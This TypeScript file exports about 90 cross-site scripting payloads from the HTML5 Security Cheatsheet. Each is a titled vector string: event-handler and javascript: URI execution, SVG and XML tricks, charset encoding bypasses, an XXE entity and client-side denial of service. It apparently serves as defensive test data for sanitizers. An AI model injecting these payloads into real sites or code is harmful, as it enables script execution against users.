// SPDX-License-Identifier: MPL-2.0
/**
 * This Source Code Form is subject to the terms of the Mozilla Public License, v. 2.0. If a copy of the MPL
 * was not distributed with this file, You can obtain one at https://mozilla.org/MPL/2.0/.
 *
 * XSS vectors from the HTML5 Security Cheatsheet (https://html5sec.org).
 *
 * Source: https://github.com/cure53/H5SC/blob/1a91bbc085426579ebcdefb1bc5450760db3dad5/items.js
 * (commit 1a91bbc085426579ebcdefb1bc5450760db3dad5, 2022-02-23) with the placeholders of
 * https://github.com/cure53/H5SC/blob/b605771c35473ef95de430e34a49e119771c53f9/payloads.js
 * (commit b605771c35473ef95de430e34a49e119771c53f9, 2015-08-13) substituted; retrieved 2026-10-12.
 * Copyright (c) Cure53 and the H5SC contributors; each vector is credited to its reporter in items.js.
 *
 * Changes: the `data` values of the items were extracted as string literals, deduplicated against the other
 * vector files, limited to payloads that contain markup and are at most 600 characters long, and capped at the
 * first 90 matching entries. Only the vector strings and their titles are kept.
 */

export const HTML5SEC_VECTORS: readonly (readonly [name: string, payload: string])[] = [
	[
		'#1 XSS via formaction - requiring user interaction (1)',
		'<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
	],
	[
		'#2 XSS via x-imap4-modified-utf7 (1)',
		'<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi',
	],
	[
		'#3 XSS via x-imap4-modified-utf7 (2)',
		'<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>',
	],
	[
		'#4 Self-including DOM Worker XSS',
		'0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
	],
	[
		'#5 Firefox crypto object - hidden eval()',
		"<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",
	],
	['#6 Firefox setter based JavaScript execution', '<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>'],
	['#7 Self-executing focus event via autofocus', '<input onfocus=write(1) autofocus>'],
	['#8 Self-executing blur event via autofocus competition', '<input onblur=write(1) autofocus><input autofocus>'],
	[
		'#9 Opera link-source JavaScript execution via CSS',
		'<a style="-o-link:\'javascript:alert(1)\';-o-link-source:current">X</a>',
	],
	['#10 JavaScript execution via <VIDEO> poster attribute', '<video poster=javascript:alert(1)//></video>'],
	[
		'#11 SVG executing JavaScript via <G> tag and onload attribute',
		'<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>',
	],
	[
		'#12 Self-executing JavaScript via <BODY> onscroll autofocus',
		'<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
	],
	[
		'#13 Client-side denial of service via repeat templates',
		'<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
	],
	[
		'#14 Client-side denial of service via faulty regular expressions',
		'<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>',
	],
	['#15 JavaScript execution via sharp variables', '<script>({0:#0=alert/#0#/#0#(0)})</script>'],
	[
		'#16 Using onbegin and HTML+TIME to execute JavaScript',
		'X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >',
	],
	['#17 Opera XML-stylesheets executing JavaScript', '<?xml-stylesheet href="javascript:alert(1)"?><root/>'],
	[
		'#18 Entities inside <SCRIPT> and comparable tags',
		'<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>',
	],
	[
		'#19 XSS via &#188 and &#190 in MacFarsi, MacArabic and MacHebrew',
		'<meta charset="x-mac-farsi">¼script ¾alert(1)//¼/script ¾',
	],
	[
		'#20 JavaScript execution via overwritten ReferenceError object',
		"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>",
	],
	[
		'#21 JavaScript execution via proprietary __noSuchMethod__',
		"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",
	],
	['#22 Input stealing/form DoS with onblur=focus() and autofocus', '<input onblur=focus() autofocus><input>'],
	[
		'#23 Form surveillance with onformchange, onforminput and form attributes',
		'<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>',
	],
	[
		'#24 JavaScript execution via HTML+TIME without user interaction (1)',
		'1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>',
	],
	['#25 Self-including E4X-based JavaScript snippet', '<script src="#">{alert(1)}</script>;1'],
	[
		'#27 Opera whole-page click hijacking via CSS',
		"<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>",
	],
	[
		'#28 JavaScript execution via HTML+TIME without user interaction (2)',
		'1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>',
	],
	[
		'#29 JavaScript execution via <LINK> href attribute and data URI',
		'<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d',
	],
	[
		'#30 JavaScript execution via <STYLE> @import and data URI',
		'<style>@import "data:,*%7bx:expression(write(1))%7D";</style>',
	],
	['#31 JavaScript execution via <FRAMESET> and onload', '<frameset onload=alert(1)>'],
	['#32 JavaScript execution via <TABLE> and background', '<table background="javascript:alert(1)"></table>'],
	[
		'#33 Breaking pointer-events:none with nested links',
		'<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>',
	],
	[
		'#34 VML frame with embedded VML object plus onmouseover',
		'1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>',
	],
	[
		'#35 VML line object utilizing href attribute with JavaScript URI',
		'1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',
	],
	[
		'#36 AnchorClick behavior enabling folder attribute as href replacement',
		'<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>',
	],
	['#37 HTML comment parsing issues (1)', '<!--<img src="--><img src=x onerror=alert(1)//">'],
	['#38 HTML comment parsing issues (2)', '<comment><img src="</comment><img src=x onerror=alert(1)//">'],
	[
		'#39 CDATA section parsing issues',
		'<!-- up to Opera 11.52, FF 3.6.28 -->\r\n<![><img src="]><img src=x onerror=alert(1)//">\r\n\r\n<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\r\n<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>',
	],
	['#40 Plaintext tags used for markup obfuscation', '<style><img src="</style><img src=x onerror=alert(1)//">'],
	[
		'#41 Error handler via empty list-style and load handler via empty content',
		'<li style=list-style:url() onerror=alert(1)></li>\n<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>',
	],
	[
		'#42 Link hijacking via <BASE> and JavaScript URI',
		'<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>',
	],
	[
		'#43 Opera 10 SVG font XSS',
		'<?xml version="1.0" standalone="no"?>\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<style type="text/css">\r\n@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}\r\n</style>\r\n</head>\r\n<body>Hello</body>\r\n</html>',
	],
	['#44 Opera @import based XSS inside attribute selectors', "<style>*[{}@import'test.css?]{color: green;}</style>X"],
	['#45 CSS-string breaking', '<div style="font-family:\'foo[a];color:red;\';">XXX</div>'],
	['#46 Alternative CSS syntax in Internet Explorer', '<div style="font-family:foo}color=red;">XXX</div>'],
	[
		'#47 SVG file executing JavaScript via <SCRIPT> tag',
		'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
	],
	[
		'#48 JavaScript execution via <SCRIPT> for and event attributes',
		'<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>',
	],
	[
		'#49 JavaScript execution via <OBJECT> DataURL attribute',
		'<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
	],
	[
		'#50 JavaScript execution via <OBJECT> data',
		'<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
	],
	[
		'#51 JavaScript execution via <EMBED> src',
		'<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>\r\n\r\n<embed src="javascript:alert(1)"></embed> // Firefox only',
	],
	['#52 Internet Explorer Scriptlets executing JavaScript', '<x style="behavior:url(test.sct)">'],
	[
		'#53 Internet Explorer Data Islands executing JavaScript',
		'<xml id="xss" src="test.htc"></xml>\r\n<label dataformatas="html" datasrc="#xss" datafld="payload"></label>',
	],
	[
		'#54 Self-hijacking JSON literals',
		"<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>",
	],
	['#55 JavaScript execution via <VIDEO> and <SOURCE> tag (1)', '<video><source onerror="alert(1)">'],
	['#56 JavaScript execution via <VIDEO> and <SOURCE> tag (2)', '<video onerror="alert(1)"><source></source></video>'],
	['#57 Tags nested in other tags to trick filters', '<b <script>alert(1)//</script>0</script></b>'],
	[
		'#58 E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time',
		'<b><script<b></b><alert(1)</script </b></b>',
	],
	[
		'#59 XSS using accent grave when copying innerHTML (1)',
		'<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
	],
	[
		'#60 Obfuscation css-properties and values via ignored extra characters',
		'<div style="[a]color[b]:[c]red">XXX</div>',
	],
	[
		'#61 CSS encoding and escaping',
		'<div  style="\\63&#9\\06f&#10\\0006c&#12\\00006F&#13\\R:\\000072 Ed;color\\0\\bla:yellow\\0\\bla;col\\0\\00 \\&#xA0or:blue;">XXX</div>',
	],
	[
		'#62 Simulating attributes in IE',
		"<!-- IE 6-8 -->\r\n<x '=\"foo\"><x foo='><img src=x onerror=alert(1)//'>\r\n\r\n<!-- IE 6-9 -->\r\n<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>\r\n<? '=\"foo\"><x foo='><img src=x onerror=alert(3)//'>",
	],
	[
		'#63 JavaScript execution via src attribute',
		'<embed src="javascript:alert(1)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF\r\n<img src="javascript:alert(2)">\r\n<image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓\r\n<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓',
	],
	[
		'#64 Arbitrary payload injection via XML External Entities (XXE)',
		'<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>',
	],
	[
		'#65 SVG element allows automatic execution of onload attribute without other SVG elements.',
		'<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>',
	],
	[
		'#66 Opera XML-stylesheets executing JavaScript (2)',
		"<?xml version=\"1.0\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E\"?>\n<root/>",
	],
	[
		'#67 XML ATTLIST declaration causing JavaScript execution',
		'<!DOCTYPE x [\r\n\t<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"\r\n onerror CDATA "alert(1)"\r\n onload CDATA "alert(2)">\r\n]><img />',
	],
	[
		'#68 Passive JavaScript execution via XLinks',
		'<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">\r\n\t<html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x>\r\n</doc>',
	],
	[
		'#69 Opera WML JavaScript execution via timer event',
		'<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>',
	],
	[
		'#70 JavaScript execution via IE filters and onfilterchange',
		'<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>',
	],
	['#71 Slash-tags accepting style attributes', '<// style=x:expression\\28write(1)\\29>'],
	[
		'#72 XSS via formaction - requiring user interaction (2)',
		'<form><button formaction="javascript:alert(1)">X</button>',
	],
	['#73 Server-sent events - Opera and <EVENT-SOURCE> tags (1)', '<event-source src="event.php" onload="alert(1)">'],
	[
		'#74 Server-sent events - Opera and <EVENT-SOURCE> tags (2)',
		'<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>',
	],
	['#75 E4X used to close an opening <SCRIPT> tag and {} evaluation', '<script<{alert(1)}/></script </>'],
	[
		'#76 Arbitrary payload injection via XML external DTD in IE',
		'<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>',
	],
	[
		'#77 XML JavaScript execution via style attribute in IE',
		'<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>',
	],
	[
		'#78 Arbitrary payload injection via XSL + XDR-schema in IE',
		'<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>',
	],
	[
		'#79 <OBJECT> tag and Flash files executing JavaScript',
		'<object allowscriptaccess="always" data="test.swf"></object>',
	],
	['#80 IE6 and halfwidth/fullwidth Unicode characters', '<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style>'],
	[
		'#81 Active JavaScript execution via XLink',
		'<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>',
	],
	[
		'#82 JavaScript execution via XML stylesheet, data URI and expression()',
		'<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>',
	],
	[
		'#83 Obfuscated WML injection via undeclared WAP-ML Variables',
		'<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>',
	],
	[
		'#84 Opera JavaScript execution via XML-events handler',
		'<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>',
	],
	[
		'#85 Arbitrary payload injection in Opera via XML-events handler',
		'<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>',
	],
	['#86 Passive JavaScript execution via <BODY> and oninput attribute', '<body oninput=alert(1)><input autofocus>'],
	[
		'#87 SVG simple passive JavaScript execution via XLink',
		'<svg xmlns="http://www.w3.org/2000/svg">\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a>\n</svg>',
	],
	[
		'#88 SVG active JavaScript execution via XLink in Opera',
		'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n\n<animation xlink:href="javascript:alert(1)"/>\n<animation xlink:href="data:text/xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'alert(1)\'%3E%3C/svg%3E"/>\n\n<image xlink:href="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'alert(1)\'%3E%3C/svg%3E"/>\n\n<foreignObject xlink:href="javascript:alert(1)"/>\n<foreignObject xlink:href="data:text/xml,%3Cscript xmlns=\'http://www.w3.org/1999/xhtml\'%3Ealert(1)%3C/script%3E"/>\n\n</svg>',
	],
	[
		'#89 SVG event handler injection via "set" and "animate"',
		'<svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="alert(1)"/>\n<animate attributeName="onunload" to="alert(1)"/>\n</svg>',
	],
	[
		'#90 SVG images containing XML data - with disabled JavaScript',
		'<!-- Up to Opera 10.63 -->\r\n<div style=content:url(test2.svg)></div>\r\n\r\n<!-- Up to Opera 11.64 - see link below -->\r\n\r\n<!-- Up to Opera 12.x -->\r\n<div style="background:url(test5.svg)">PRESS ENTER</div>',
	],
	[
		'#91 Special tags parsing issues',
		'[A]\n<? foo="><script>alert(1)</script>">\n<! foo="><script>alert(1)</script>">\n</ foo="><script>alert(1)</script>">\n[B]\n<? foo="><x foo=\'?><script>alert(1)</script>\'>">\n[C]\n<! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>">\n[D]\n<% foo><x foo="%><script>alert(1)</script>">',
	],
]
